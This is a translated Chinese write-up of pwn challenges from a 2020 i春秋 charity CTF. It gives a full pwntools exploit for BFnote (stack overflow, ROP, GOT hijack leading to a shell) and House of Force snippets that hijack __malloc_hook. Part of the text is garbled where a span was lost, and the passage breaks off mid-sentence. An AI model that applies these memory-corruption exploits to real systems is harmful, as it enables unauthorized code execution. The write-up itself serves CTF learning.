# 2020-i春秋-公益CTF复盘-Pwn
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x01 前言
在这次比赛中，有一些题还是很有亮点的，也是在比赛中学到了一些新知识，特此记录~
## 0x02 FirstDay_BFnote
本题由`5k1l[@W](https://github.com/W "@W")&M`、`咲夜南梦[@W](https://github.com/W
"@W")&M`提供了思路提示，在此表示感谢~
###  题目信息
题目流程较为明确，在Description和postscript处存在明显的栈溢出，但是题目开启了Canary保护导致栈溢出较难利用，程序接下来虽然产生了heap操作，但是因为没有free，且没有重复操作，导致heap几乎无法利用。
进一步可以看出，程序在`Line 24`进行了判断以保证`i`满足`i ')
        sh.send(p16((sh.libc.address+0x5e400) & 0xffff))
        raw_input('>')
        sh.send('x70')
        sh.interactive()
        flag=get_flag(sh)
        log.success('The flag is '+flag)
⚠️：sh.libc.address在remote模式下不可用，需要写死后两个字节，1/16的运行成功几率。
###  构造ROP链——思路二
在`ROPgadget`中，我们看到了这样的`gadget`
然而我们又能通过`pop ebp`这个gadget直接控制ebp的值，那么我们就可以做到一个有限的任意地址写。
可以看到，程序中和system离得最近，且小于system的函数是`exit()`，但是`exit()`函数未曾调用过，因此延迟绑定还没有生效。
那么我们可以首先控制ebp为`atol[@GOT](https://github.com/GOT "@GOT") + 1 + 0x17fA8b40`。
然后执行`0x3AD - 0x2d2 = 0xDB`次的`inc dword ptr [ebp - 0x17fa8b40] ; ret
0`这相当于是对`atol[@GOT](https://github.com/GOT
"@GOT")`做了`+0xDB00`操作，然后在调用`read`向`atol[@GOT](https://github.com/GOT
"@GOT")`低位写入1字节，即可成功劫持`atol`函数的GOT表地址。
###  Final Exploit——思路二
    from pwn import *
    import sys
    context.log_level='debug'
    # context.arch='amd64'
    context.arch='i386'
    BFnote=ELF('./BFnote', checksec = False)
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./", checksec = False)
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./BFnote")
    def get_address(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        log.success(info+str(hex(return_address+offset)))
        return return_address+offset
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh,stop=False):
        gdb.attach(sh)
        if stop :
            raw_input()
    if __name__ == "__main__":
        sh = get_sh()
        p___ret  = 0x080489db
        pp__ret  = 0x080489da
        ppp_ret  = 0x080489d9
        binsh_a  = 0x0804A060
        read_md  = 0x0804A068
        payload  = '/bin/shx00'
        payload  = payload.ljust(0x200,'x00')
        payload += p32(p___ret)
        payload += p32(BFnote.got['atol'] + 1 + 0x17fA8b40)
        payload += p32(0x08048434) * 0xDB
        payload += p32(BFnote.plt['read'])
        payload += p32(ppp_ret)
        payload += p32(0)                                  # fd
        payload += p32(BFnote.got['atol'])                 # buf
        payload += p32(1)                                  # size
        payload += p32(BFnote.plt['atol'])
        payload += p32(p___ret)
        payload += p32(binsh_a)                            
        sh.recvuntil('nGive your description : ')
        sh.sendline('A' * 0x32 + 'AAAA' + p32(0) + p32(0x804A260 + 4))
        sh.recvuntil('Give your postscript : ')
        sh.sendline(payload)
        sh.recvuntil('nGive your notebook size : ')
        sh.sendline(str(int(0x24000)))
        sh.recvuntil('Give your title size : ')
        sh.sendline(str(int(0x2570C - 0x10)))
        sh.recvuntil('invalid ! please re-enter :n')
        sh.sendline(str(int(0x10)))
        sh.recvuntil('nGive your title : ')
        sh.sendline('x00' * 0xF)
        sh.recvuntil('Give your note : ')
        sh.send('A' * 4)
        raw_input('>')
        sh.send('xA0')
        sh.interactive()
        flag=get_flag(sh)
        log.success('The flag is '+flag)
## 0x03 FirstDay_force
###  题目信息
全保护程序
###  漏洞分析
可以发现，程序中只有一个add的功能，没有其他函数可以用，并且发现了一处明显的越界写可以用来劫持`Top Chunk`。
于是使用`House of force`的攻击思路。
####  Leak Libc
可以发现程序会告诉我们我们申请下来的chunk的位置，那么当我们申请一个极大Chunk时，程序会调用`mmap`进行内存分配，分配下来的地址是libc跟随的地址。
    sh.recvuntil('2:puts')
    sh.sendline('1')
    sh.recvuntil('size')
    sh.sendline(str(0x100000))
    libc_base = get_address(sh,'We get libc base address is ','bin addr 0x','n',-0x4D2010,True)
    malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
    sh.sendline('Chunk0')
####  劫持Top Chunk
构造如下payload可以修改Top Chunk的size域为`0xFFFFFFFFFFFFFFFF`，顺便泄露heap地址
    sh.recvuntil('2:puts')
    sh.sendline('1')
    sh.recvuntil('size')
    sh.sendline(str(0x20))
    heap_base = get_address(sh,'We get heap base address is ','bin addr 0x','n',-0x10,True)
    sh.sendline(p64(0) * 5 + p64(0xFFFFFFFFFFFFFFFF))
#### 劫持`__malloc_hook`
接下来我们要将Top_Chunk”推”到我们想要劫持的`__malloc_hook`处。
> 首先是libc会检查用户申请的大小，top chunk是否能给的起，如果给得起，就由top